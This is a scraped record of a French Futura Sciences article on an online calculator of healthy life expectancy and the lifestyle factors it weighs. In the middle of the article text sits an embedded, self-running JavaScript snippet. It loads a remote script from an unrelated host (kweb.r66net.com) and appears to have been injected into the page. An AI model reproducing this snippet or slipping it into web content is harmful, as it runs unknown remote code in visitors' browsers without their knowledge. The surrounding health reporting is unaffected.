{"title": "Longévité : et si vous calculiez votre espérance de vie !", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "20/10/2017", "content": "Des chercheurs américains ont mis en ligne un calculateur de l'espérance de vie. À partir d'informations sur votre morphologie, votre mode de vie, vos problèmes de santé, il vous fournit une estimation du nombre d'années en bonne santé qu'il vous reste à vivre... Ce qu'il faut retenir L'espérance de vie dépend, du sexe, de l'IMC, de l'alimentation, de l'exercice physique... Beaucoup de ces paramètres peuvent être modifiables par des choix de vie. L'espérance de vie s'est accrue au cours du siècle dernier. Au cours du 20 e  siècle, l' espérance de vie  s'est beaucoup allongée. D'après l' Ined , l'institut national d'études démographiques, elle a quasiment doublé en France sur cette période. Ceci est lié à la baisse de la mortalité infantile : en 1900, 15 % des enfants mouraient avant un an, contre 5 % en 1950 et 0,4 % en 2015. Voir aussi : L’espérance de vie va continuer à progresser dans les pays développés Nous vivons de plus en plus longtemps. Mais combien de ces années gagnées se déroulent en bonne santé ? Car le  vieillissement  de la population s'accompagne aussi de plus en plus de cas de  maladies chroniques  dans les populations âgées : le nombre de patients souffrant de  pathologies  neurodégénératives est particulièrement important, par exemple. Or les coûts médicaux, les services de santé, dépendent de l'état de santé des individus d'une société. D'où l'intérêt de pouvoir estimer le nombre d'années que les gens vont passer en bonne ou en moins bonne santé. Une équipe de l'université du Connecticut a donc développé un outil prenant en compte la qualité de vie dans l'espérance de vie. Jeyaraj Vadiveloo, directeur du Centre de recherche actuariel Janet et Mark L. Goldenson à l'université du Connecticut, décrit cet outil dans un article paru dans  The Conversation .  Pour créer cette calculette, il a fallu prendre en compte les facteurs qui participent à l'espérance de vie. Il y en a sur lesquels vous ne pouvez pas vraiment agir : votre  âge  et votre sexe. Ainsi, globalement, les femmes vivent plus longtemps que les hommes. Mais beaucoup de facteurs dépendent des modes de vie. L’activité physique participe à l’espérance de vie en bonne santé. © Viacheslav Iakobchuk, Fotolia                               Vivre plus longtemps en faisant plus de sport et en mangeant mieux Un outil gratuit a été  mis en ligne  (en anglais) ; si vous voulez le tester, il vous faudra traduire votre poids et votre taille en livres et pieds respectivement. Comme l'alimentation, l'exercice, la quantité de  sommeil  ont un impact sur le nombre d'années en bonne santé, ces facteurs ont été inclus dans les questions posées aux utilisateurs. D'autres facteurs sont pris en compte : le niveau d'instruction, le revenu, la perception de son état de santé, la consommation d' alcool , le tabagisme et le fait d'avoir du  diabète  de type 2. En effet, plus votre niveau d'instruction et vos revenus sont élevés, plus vous avez d'années à vivre en bonne santé. Le fait d'avoir une perception positive de sa santé est aussi un plus. Mais certains facteurs influençant l'espérance de vie n'ont pas été pris en compte comme le  stress  ou les liens sociaux.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La calculette vous donne le nombre d'années qu'il vous reste à vivre en bonne et en mauvaise santé. Cet outil n'a pas encore été validé scientifiquement. Il donne juste une prévision, sans tenir compte des accidents de la vie. L'outil signale aussi le nombre de mois de vie en bonne santé que vous pourriez gagner en changeant vos habitudes, par exemple en faisant plus d'exercice. Le saviez-vous ? En France, en 2016, une femme vivait en moyenne 85 ans et un homme 79 ans. Cette simulation permet de prendre conscience que les choix de vie influencent considérablement l' espérance de vie .  Dans son article, Jeyaraj Vadiveloo prend l'exemple d'un homme de 60 ans en bonne santé qui fait de l'exercice régulièrement, a une alimentation saine, un  IMC  normal et dort au moins huit heures par nuit. D'après la calculette, il pourrait vivre 13 ans de plus en bonne santé qu'un homme qui n'aurait pas une vie aussi saine.  Interview : trois conseils pour vivre plus longtemps                       Vivre bien et longtemps est certainement une préoccupation universelle, mais malheureusement nous ne sommes pas tous égaux face à la vieillesse et l'espérance de vie n'est pas la même pour tout le monde. Futura-Sciences a interviewé Vera Gorbunova, chercheuse en biologie, lors de son allocution à TEDxCannes, afin qu’elle nous donne quelques conseils pour vivre plus longtemps.                                       ", "theme": "sante"}